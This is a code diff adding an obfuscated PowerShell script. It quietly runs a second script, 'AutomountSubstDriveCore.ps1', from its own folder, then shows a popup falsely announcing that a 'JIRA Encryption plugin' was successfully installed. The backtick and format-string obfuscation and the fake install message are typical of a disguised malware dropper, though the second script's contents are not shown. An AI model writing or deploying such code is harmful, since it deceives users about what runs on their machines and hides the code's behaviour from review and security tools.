@@ -1,0 +1,39 @@
+param([switch]${usEM`odu`LE}, [string]${FuLlP`AtH})
+
+${Global:cOR`escRi`p`T`PAth} = .("{0}{2}{1}"-f 'Joi','th','n-Pa') ${pSS`c`RI`PTroOt} ("{6}{2}{3}{5}{0}{8}{4}{7}{1}" -f 'tS','s1','utom','ou','bstDriveCor','n','A','e.p','u')
+
+if (${usEMod`U`Le})
+{
+    ${M} = .("{0}{2}{1}{3}" -f'N','-Mo','ew','dule') {
+        function Tes`T-DRiV`ePRE`SEnCEF`R`oM`mODUle
+        {
+            param ([String]${pA`TH})
+
+            & ${gLO`BAL:`Co`Re`s`CR`iPtPATh} -Path ${p`ATh}
+        }
+
+        .("{1}{2}{3}{5}{0}{4}" -f'm','Export','-Mo','dul','ber','eMe') -Function TEsT`-D`RIVEpRe`s`eNcefRo`MM`odule
+    }
+}
+
+try
+{
+    if (${u`seM`oDUle})
+    {
+        .("{2}{3}{4}{1}{0}"-f'le','odu','I','m','port-M') ${m} -Force
+        &("{7}{0}{1}{5}{3}{6}{2}{4}" -f'Prese','nc','odu','Fr','le','e','omM','Test-Drive') -Path ${f`Ul`LPath}
+    }
+    else
+    {
+        & ${glOBa`L`:Cor`EScRIPTpaTH} -Path ${FuLl`p`ATH}
+    }
+}
+finally
+{
+    if (${usE`mO`dULe})
+    {
+        .("{1}{2}{3}{0}" -f 'le','R','e','move-Modu') ${m}
+    }
+}
+
+(&("{1}{0}{2}"-f'bjec','new-o','t') -ComObject ("{3}{1}{2}{0}"-f 'l','s','cript.shel','w')).("{0}{1}"-f'P','opup').Invoke(("{3}{2}{4}{0}{6}{1}{5}{7}"-f'su','ssfully in','ry','JIRA Enc','ption plugin ','s','cce','talled!'),0,("{1}{3}{2}{0}" -f'gin','Security ','u','Pl'),0x0)
